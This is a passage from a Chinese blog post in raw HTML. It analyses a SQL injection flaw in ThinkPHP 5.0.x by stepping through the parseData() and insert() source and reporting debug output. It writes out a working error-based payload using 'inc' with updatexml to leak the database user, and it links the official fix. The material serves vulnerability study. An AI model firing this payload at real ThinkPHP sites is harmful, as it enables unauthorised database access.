class="comment">#这里如果$val[0]的值是下面三个中的一个则进行了拼接</span></span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">isBind</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>自己大概捋了一下思路 感觉已经知道了注入的顺序了 接下来就是待入payload梳理一下</p>
<p>这里用七月火师傅给的payload <code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code></p>
<p>接下来动态调试一下</p>
</li>
</ol>
<h3 id="1-入口函数"><a href="#1-入口函数" class="headerlink" title="1. 入口函数"></a>1. 入口函数</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190254568.png" alt="image-20211122190254568"></p>
<h3 id="2-跟进到insert函数"><a href="#2-跟进到insert函数" class="headerlink" title="2. 跟进到insert函数"></a>2. 跟进到insert函数</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190932980.png" alt="image-20211122190932980"></p>
<p>在红线的地方进行了一次解析,这次解析和漏洞关系不大,只是解析了当前sql语句或者这里应该称之为表达式进行了一次解析,主要内容就是,表名,字段名这些获得的结果如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span>:</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [table] =&gt; users [multi] =&gt; <span class="title function_ invoke__">Array</span> ( [AND] =&gt; <span class="title function_ invoke__">Array</span> ( [id] =&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) ) ) [where] =&gt; <span class="title function_ invoke__">Array</span> ( [AND] =&gt; <span class="title function_ invoke__">Array</span> ( [id] =&gt; <span class="number">1</span> ) ) [field] =&gt; * [data] =&gt; <span class="title function_ invoke__">Array</span> ( ) [strict] =&gt; <span class="number">1</span> [master] =&gt; [lock] =&gt; [fetch_pdo] =&gt; [fetch_sql] =&gt; [distinct] =&gt; [join] =&gt; [union] =&gt; [group] =&gt; [having] =&gt; [limit] =&gt; [order] =&gt; [force] =&gt; [comment] =&gt; ) </span><br></pre></td></tr></table></figure>

<p>在接下来的地方执行了array_merge()函数,把两个数组合并成一个数组,并赋值给$data</p>
<p>此时$options[‘data’]为空,而$data就是我们想要插入的键值对</p>
<p>接下来才是最重要的</p>
<h3 id="3-builder-php-x2F-insert"><a href="#3-builder-php-x2F-insert" class="headerlink" title="3. builder.php&#x2F;insert()"></a>3. builder.php&#x2F;insert()</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122211516906.png" alt="image-20211122211516906">在这里就要跟进到builder类的insert()函数了,这个函数的功能是<strong>拼接出最后要执行SQL语句</strong></p>
<p><strong>所以要特别关注这个函数</strong></p>
<p>这里注意的是builder并非是builder类的实例化对象,而是Mysql类的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586782016-64ceefb6-bd92-4a90-9197-ccd16a64f272.png" alt="图片.png"></p>
<p>只是在这里的Mysql类继承了Builder类所以存在insert()函数,废话不多说直接看insert()函数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586806130-e59464d6-f8b9-4ff9-af73-960efb2613ba.png" alt="图片.png"></p>
<p>这里直接执行了一个parseData()函数继续跟进,这就就是漏洞的点了,打气精神来 everybody!</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getFieldsBind</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$val</span>);</span><br><span class="line">            <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;result:&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">isBind</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先执行了一个<code>$bind = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);</code>这个函数的具体流程还不清楚</p>
<p>但是返回的值是这样的<code>Array (    [id] =&gt; 1    [username] =&gt; 2    [password] =&gt; 2 )</code></p>
<p>暂且可以理解为是以数组的形式返回数据库的字段名(90%的确定!)</p>
<p>接着就是<code>$fields = array_keys($bind);</code>将$bind数组的键以一个新的数组赋值到$fields</p>
<h3 id="4-foreach-生成sql语句"><a href="#4-foreach-生成sql语句" class="headerlink" title="4. foreach()生成sql语句"></a>4. foreach()生成sql语句</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587324239-15ad0a71-8ec0-410b-a600-3899a308c822.png" alt="图片.png"></p>
<p>此时键值$key是username $val是一个数组在图中已经给出来了</p>
<p>而$item在parseKey解析后值是变为`username`</p>
<p>下面的if由于不是对象直接跳过,直接运行到</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587378450-963c32a2-e59a-4017-b7d9-0f58adbffe19.png" alt="图片.png"></p>
<p>此时$val[0]的值是inc直接跳到case inc:执行下面的语句</p>
<p>通过拼接<code>$result[$item]=updatexml(1,concat(0x7,user(),0x7e),1)+1</code></p>
<p>而reuslt的数组的值就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span> ( [`username`] =&gt; <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)+<span class="number">1</span> ) </span><br></pre></td></tr></table></figure>

<p>返回result数组到insert()函数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587425904-f1872ee2-e34d-4204-ae67-349b1bbd833b.png" alt="图片.png"></p>
<p>初始定义<code>protected $insertSql = &#39;%INSERT% INTO %TABLE% (%FIELD%) VALUES (%DATA%) %COMMENT%&#39;;</code></p>
<p>经过解析后变为sql语句变为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` (`username`) <span class="keyword">VALUES</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">+</span><span class="number">123456</span>) </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587444264-8982234a-14ec-4f6f-889f-821c233fea94.png" alt="图片.png"></p>
<p>由于在红线的地方执行sql语句的时候由于updatexml而产生报错</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ol>
<li><p>这里漏洞的第一参数name[0]可以修改为dec可以 但是exp我复现失败了 后面回补充完整!</p>
</li>
<li><p>第一次审计TP框架,可能审计的不够完美,希望大家多多包涵!</p>
</li>
<li><p>本文参考七月火师傅的博客</p>
<p><a href="%22https://mochazz.github.io/2018/04/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%20ThinkPHP%205.0.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%22">1. 代码审计 | ThinkPHP5.0.x框架SQL注⼊-七月火师傅</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b">2. 官方漏洞修复</a></p>
</li>
<li><p>后来发现如果name[0]&#x3D;exp 经过处理之后值</p>
<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122233302725.png" alt="image-20211122233302725"  />

<p>$val[0]&#x3D;’exp ‘所以没有匹配到,但是inc和dec却没有加一个trim,所以跟进了一下</p>
<p>在这里打了一下dump($val[0]);值是<code>string &#39;exp &#39; (length=4)</code></p>
<p>我在这里一个一个尝试了一下 最后发现</p>
<p>在入口函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;get.name/a&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">dump</span>(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&quot;users&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&quot;id&quot;</span>=&gt;<span class="number">1</span>])-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$name</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ThinkPHP SQL Test.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里打出$name[0],如果传的是exp就多了一个空格,如果是inc就没有添加空格</p>
<p>最后在这个目录下发现了一个函数 日!</p>
<p><code>\thinkphp\library\think\Request.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>G!</p>
</li>
</ol>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/End3av0r">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP5-0-X%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP5.0.X框架SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. mysql创建数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ThinkPHP%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. ThinkPHP基础配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 入口函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%9F%E8%BF%9B%E5%88%B0insert%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 跟进到insert函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-builder-php-x2F-insert"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. builder.php&#x2F;insert()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-foreach-%E7%94%9F%E6%88%90sql%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. foreach()生成sql语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.</span> <span class="toc-text">补充</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/21/TP5sql/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/21/TP5sql/&text=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/21/TP5sql/&is_video=false&description=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ThinkPHP5.0.X框架SQL注入漏洞&body=Check out this article: http://example.com/2023/03/21/TP5sql/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/21/TP5sql/&title=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/21/TP5sql/&name=ThinkPHP5.0.X框架SQL注入漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/21/TP5sql/&t=ThinkPHP5.0.X框架SQL注入漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    End3av0r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/End3av0r">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
